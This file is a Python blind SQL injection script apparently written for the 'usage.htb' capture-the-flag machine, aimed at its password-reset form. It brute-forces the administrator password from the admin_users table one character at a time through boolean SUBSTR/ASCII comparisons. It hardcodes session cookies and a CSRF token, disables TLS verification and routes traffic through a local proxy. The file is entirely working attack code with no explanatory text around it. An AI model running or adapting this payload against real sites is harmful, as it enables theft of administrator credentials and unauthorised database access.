import sys
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def extract_passwords(url):
    passwords = []

    # Extract passwords from the password column
    for i in range(1, 51):  # Assuming password length is no longer than 50 characters
        found = False
        for j in range(32, 127):  # ASCII printable characters range
            sqli_payload = f"admin23@gmail.com' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT password FROM admin_users LIMIT 1), {i}, 1)) = {j}) THEN 'true' ELSE 'false' END) = 'true' -- -"
            form_data = {
                '_token': 'fKzRZqyfDmEHvCaq1zgsTFHzzMETunRa7ltaGXSU',
                'email': sqli_payload
            }
            headers = {
                "Host": "usage.htb",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "http://usage.htb",
                "Connection": "close",
                "Referer": "http://usage.htb/forget-password",
                "Upgrade-Insecure-Requests": "1",
                "Cookie": "XSRF-TOKEN=eyJpdiI6Ilc4b2VMQmY0SUM0bHphaDJUYU0vY2c9PSIsInZhbHVlIjoiRDVyaEVyN2xwOUczd1I0eThnTnVMWjE2OUZzUjJIakIveTBFZEx3TmFUS1YvVlYzanRoazdnVEQxNjZKdmJaazhRdlhYdkF6c0EwaHBacThkdlJtYzJLWnNqU1UxdldDL2dLMmJhQ21kcDNvQkpWZGYwWldLVktIb0FibWJqZ0kiLCJtYWMiOiJkNTY5YmY3YjBkYjU1MTk2MmY5NzhkZTExYTQyZjFiOGM0YjUwNDQxNjZmMzUyM2IwM2QxYmFlYWRjN2IzNTVlIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjFDeVNzOUhKNmxtdWFqaU1nZ3gyeXc9PSIsInZhbHVlIjoiMnV2cG5MdTI2MktTcjJaNHYwbXBKREF6STRJbkpqcTBMSWtyRjZPck1BSFNwR0FmNVdQOFJhZUdjVWNyRVZPZFB2SzFMSzY2R3VBRkU1MU9BcFg1Ulp4eU1wcXRVVlNIZU9pVFdNa0c4U2hWeHR3UVVmVGJYYTBkRlBoRWV5MHkiLCJtYWMiOiJkZTQzMTgxMjg5ZWJjMGY4NjcxY2E2MTEyZDI0NWM2NzNiN2Y0NWJlMDk5ZDkzMzU3ZmQ1YTZiYWU3NDZlZmJiIiwidGFnIjoiIn0%3D"
            }
            response = requests.post(url, data=form_data, headers=headers, verify=False, proxies=proxies, allow_redirects=True)
            if "admin23@gmail.com" in response.text:
                passwords.append(chr(j))
                sys.stdout.write('\rExtracting password: ' + ''.join(passwords))
                sys.stdout.flush()
                found = True
                break
            if not found:
                sys.stdout.write('\rExtracting password: ' + ''.join(passwords) + chr(j))
                sys.stdout.flush()

    print("\n(+) Passwords extracted from the password column:", ''.join(passwords))
    return ''.join(passwords)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s http://example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Extracting passwords from the password column of admin_users table...")
    extracted_passwords = extract_passwords(url)

if __name__ == "__main__":
    main()